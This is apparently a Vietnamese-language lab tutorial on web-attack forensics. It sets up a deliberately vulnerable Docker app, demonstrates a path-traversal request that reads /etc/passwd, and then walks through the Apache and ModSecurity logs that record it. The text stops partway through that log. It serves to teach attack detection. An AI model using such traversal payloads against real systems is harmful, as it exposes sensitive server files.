##
- Web apps là toàn bộ của cuộc sống thường ngày của chúng ta và được sử dụng trong hầu hết các hoạt động, từ mua sắm online cho đến banking và social media. Tuy nhiên, việc sử dụng rộng rãi mở ra nguy cơ tấn công lớn cho các tác nhân xấu để exploit và chiếm quyền trong hệ thống.
- Dưới đây là một số loại tấn công web apps phổ biến khác nhau và một số kỹ thuật nhận biết các loại tấn công này bằng cách phân tích web app logs và web app firewall logs, để tìm điểm tấn công, và tìm ra vấn đề gốc rễ bằng cách nhận diện lỗ hổng được khai thác.

## I. Set up môi trường:
Trước khi tìm hiẻu các loại tấn công web và forensics thì ta thiết lập môi trường bằng cách dùng Docker, nó sẽ cho phép ta hiểu sâu sắc và toàn diện hơn về nội dung được đề cập.

### Clone the repository:
``` ubuntu
git clone https://github.com/vonderchild/digital-forensics-lab && cd digital-forensics-lab/Lab\ 04/files/app
```
![image](https://hackmd.io/_uploads/HJdzEI9Vbl.png)

### Cài đặt Docker:
``` unbuntu
sudo apt-get update
sudo apt-get install -y docker.io
sudo service docker start
```

### Build & Run Docker Image:
``` ubuntu
docker build -t app:latest .
docker run -p 9090:80 app:latest
```

## II. Web Attacks & Forensics:
### 1. Web Application & WAF Logs:
- Web app logs đóng một vai trò quan trọng trong digital forensics và giúp theo dõi hoạt động của user, dò ra sự tấn công, tìm ra nguồn gốc của một tấn công và xác định quy mô ảnh hưởng của nó. Ở phần này ta sẽ tập trung vào Apache, một web server được sử dụng rộng rãi cho hosting web apps. Access logs chứa thông tin về các incoming request như địa chỉ IP của client, thời gian request, phương pháp request (GET, POST,...), requested URI, response status code (`200`, `403`, `404`,...) và user agent. Mặt khác, error logs chứa thông tin về các lỗi mà server gặp phải như các requests thất bại, events không mong đợi xảy ra trong trong quá trình xử lý request. Các logs này có thể tìm ở `/var/log/apache2` trên hệ thống Linux.
- Web apps firewalls (WAFs) là một khía cạnh quan trọng của việc bảo mật web app. Một WAF cung cấp một lớp bảo mật cho app bằng cách ngăn chặn malicious traffic trước khi nó tới được app. Trong phần này, ta sử dụng Modsecurity như web app firewall. Vị trí mặc định cho audit logs của nó là `/var/log/apache2/modsec_audit.log`. Khi một lỗi hoặc bất kì nỗ lực độc hại nào được bắt gặp trên server, nó sẽ được lưu lại trong `/var/log/apache2/error.log`.
- Cấu trúc thư mục của các logs trên:
```
var
└── log
    └── apache2
        ├── access.log
        ├── error.log
        ├── modsec_audit.log
        └── other_vhosts_access.log
```

### 2. Common Web Attacks & Logs:
- Để thực hiện web attack forensics một cách hiệu quả, ta phải có hiểu biết về các loại web attacks phổ biến. Các attacks này khai thác lỗ hổng trong web apps, biết được cách hoạt động của chúng là rất quan trọng trong việc ghép nối các events gây ra attack.
- Có rất nhiều lỗ hổng có thể khai thác trong một web app, từ lỗ hổng không có ảnh hưởng thực tế cho đến các lỗ hổng gây ra hậu quả lớn cho một tổ chức. Tuy nhiên, trong phần này ta chỉ tập trung vào một số như Path Traversal, Remote Command Execution và SQL Injection.
- Để tham gia vào lab, phần set up môi trường phải truy cập được vào http://127.0.0.1:9090/:
![image](https://hackmd.io/_uploads/SkXWSUq4-l.png)

#### a) Path Traversal:
- Được biết đến là 'directory traversal', lỗ hổng này cho phép attackers truy cập files và thư mục trên server nằm ngoài thư mục gốc. Nó thường được thực hiện bằng cách thao tác với các file path input fields trên một web app để truy cập files mà app cho phép truy cập, nhưng attacker không nên làm vậy. Loại tấn công này đạt được kết quả là các thông tin nhạy cảm như các files cấu hình và source code,... bị leak.
- Ví dụ, cho rằng ta đang ở thư mục `/home/kali/`. Để thay đổi thư mục cha đến `/home`, ta phải gõ `cd ../`. Để tới được thư mục root, ta phải gõ `cd ../../`. Các concept tương tự này được dùng trong một path traversal attack, nơi một website cho phép truy cập đến các files nằm ngoài thư mộc root của website.
> - Thuật ngữ 'Path Traversal' thường được dùng thay cho Local File Inclusion (LFI), tuy nhiên cả hai là những lỗ hổng khác nhau, Path Traversal bị giới hạn việc đọc files trên server, trong khi đó LFI đề cập đến khả năng bổ sung để thực thi files đó trên server.
> - Dấu hiệu thường gặp: `../`, `/etc/passwd`
- Để thử nó, đi đến http://127.0.0.1/images.php và nó sẽ hiển thị một số hình ảnh với một input field:
![image](https://hackmd.io/_uploads/HJhVSLqNZl.png)
- Nếu ta enter đúng image name, web app sẽ hiển thị nó cho ta. Nhưng nếu ta thử enter một file name không phải của một image, ví dụ như `/etc/passwd`, nó sẽ in ra contents của nó. Tuy nhiên, ta chỉ cần add một số leading `../` trước file name `/etc/passwd` của ta:
![image](https://hackmd.io/_uploads/S11wUL54bg.png)
- Ta đã thấy quen với phương pháp khai thác lỗ hổng này nên tiếp theo là cách dò ra nó trong logs. Để truy cập logs, đầu tiên ta phải take shell trong docker container nơi app đang chạy. Ta làm điều đó bằng cách mở một terminal khác rồi liệt kê container ID với `docker ps -q` và thực thi `doker exec` để tạo ra một shell:
![image](https://hackmd.io/_uploads/HyzUyw9NZe.png)
- Ta đã vào được root, giờ sẽ đi đến thư mục chứ access logs và in nó ra:
![image](https://hackmd.io/_uploads/BygDRyv9NZx.png)
Có thể thấy rằng, logs hiển thị các requests tạo bởi server từ địa chỉ IP `172.17.0.1` bằng cách sử dụng trình duyệt Chrome đi đến `/images.php` và `/view.php`. Hai logs áp cuối cho thấy nỗ lực khai thác lỗ hổng path traversal bằng cách truy cập file `/etc/passwd`.
- Đánh giá logs tạo bởi Modsecurity WAF, output có được:
``` ubuntu
root@d3c4a84b597b:/var/log/apache2# cat modsec_audit.log
--c630e167-A--
[06/Jan/2026:14:24:50.739242 +0500] aVzU4pG7zE_Am08YUQTRvgAAAAA 172.17.0.1 43900 172.17.0.2 80
--c630e167-B--
GET / HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 715
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Home</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">Welcome to the Lab</h1>
        <div class="row mt-5">
            <div class="col-md-4">
                <a href="images.php" class="btn btn-primary btn-block">View Images</a>
            </div>
            <div class="col-md-4">
                <a href="command.php" class="btn btn-primary btn-block">Execute Commands</a>
            </div>
            <div class="col-md-4">
                <a href="users.php" class="btn btn-primary btn-block">Get Users</a>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/"] [unique_id "aVzU4pG7zE_Am08YUQTRvgAAAAA"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691490725007 14267 (- - -)
Stopwatch2: 1767691490725007 14267; combined=5463, p1=4079, p2=916, p3=48, p4=251, p5=169, sr=3304, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:24:51.397064 +0500] aVzU45G7zE_Am08YUQTRvwAAAAA 172.17.0.1 43900 172.17.0.2 80
--49e1f51a-B--
GET /favicon.ico HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 404 Not Found
Content-Length: 273
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

--49e1f51a-E--
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 127.0.0.1 Port 9090</address>
</body></html>

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/favicon.ico"] [unique_id "aVzU45G7zE_Am08YUQTRvwAAAAA"]
Stopwatch: 1767691491394132 2956 (- - -)
Stopwatch2: 1767691491394132 2956; combined=1367, p1=366, p2=821, p3=22, p4=95, p5=63, sr=84, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.591138 +0500] aVzVGtaDAgmw-nY6-DiarQAAAAI 172.17.0.1 33226 172.17.0.2 80
--c630e167-B--
GET /images.php HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9090/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 862
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Images</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">View an Image</h1>
        <form action="" class="form-group">
            <div class="input-group mb-3">
                <input type="text" id="file" name="file" class="form-control mt-3" placeholder="Enter file name">
                <div class="input-group-append">
                    <input type="submit" value="Submit" class="btn btn-primary mt-3">
                </div>
            </div>
        </form>
                <div class="row">
            <div class="col-4">
                <img src="images/starry_night.jpg" alt="image1" class="img-fluid rounded">
                <p class="text-center mt-3">starry_night.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/almond_blossom.jpg" alt="image2" class="img-fluid rounded">
                <p class="text-center mt-3">almond_blossom.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/red_vineyards.jpg" alt="image3" class="img-fluid rounded">
                <p class="text-center mt-3">red_vineyards.jpg</p>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzVGtaDAgmw-nY6-DiarQAAAAI"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691546585341 5850 (- - -)
Stopwatch2: 1767691546585341 5850; combined=1974, p1=573, p2=1035, p3=33, p4=247, p5=86, sr=106, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.628374 +0500] aVzVGtfagPkKG1Wgy6n4DQAAAAM 172.17.0.1 33236 172.17.0.2 80
--c630e167-B--
GET /images/almond_blossom.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "276ea-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 161514
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

--c630e167-E--

--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/almond_blossom.jpg"] [unique_id "aVzVGtfagPkKG1Wgy6n4DQAAAAM"]
Stopwatch: 1767691546624102 4324 (- - -)
Stopwatch2: 1767691546624102 4324; combined=1720, p1=601, p2=860, p3=32, p4=106, p5=120, sr=77, sw=1, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:25:46.629016 +0500] aVzVGtaDAgmw-nY6-DiargAAAAI 172.17.0.1 33226 172.17.0.2 80
--49e1f51a-B--
GET /images/starry_night.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "95cbb-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 613563
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/jpeg

--49e1f51a-E--

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/starry_night.jpg"] [unique_id "aVzVGtaDAgmw-nY6-DiargAAAAI"]
Stopwatch: 1767691546623369 5683 (- - -)
Stopwatch2: 1767691546623369 5683; combined=1554, p1=504, p2=828, p3=28, p4=80, p5=114, sr=78, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.634720 +0500] aVzVGive669-ZtWihkUyOgAAAAQ 172.17.0.1 33240 172.17.0.2 80
--c630e167-B--
GET /images/red_vineyards.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "c2849-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 796745
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

--c630e167-E--

--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/red_vineyards.jpg"] [unique_id "aVzVGive669-ZtWihkUyOgAAAAQ"]
Stopwatch: 1767691546627679 7085 (- - -)
Stopwatch2: 1767691546627679 7085; combined=2330, p1=799, p2=980, p3=29, p4=83, p5=439, sr=100, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--c630e167-A--
[06/Jan/2026:14:30:30.020396 +0500] aVzWNmLm1Ko6nAjfB6CuegAAAAU 172.17.0.1 47440 172.17.0.2 80
--c630e167-B--
GET /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 302 Found
Location: http://127.0.0.1:9090/view.php?image=../../../../../etc/passwd
Content-Length: 2149
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Images</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">View an Image</h1>
        <form action="" class="form-group">
            <div class="input-group mb-3">
                <input type="text" id="file" name="file" class="form-control mt-3" placeholder="Enter file name">
                <div class="input-group-append">
                    <input type="submit" value="Submit" class="btn btn-primary mt-3">
                </div>
            </div>
        </form>
                <div class="row">
            <div class="col-4">
                <img src="images/starry_night.jpg" alt="image1" class="img-fluid rounded">
                <p class="text-center mt-3">starry_night.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/almond_blossom.jpg" alt="image2" class="img-fluid rounded">
                <p class="text-center mt-3">almond_blossom.jpg</p>
            </div>
            <div class="col-4">
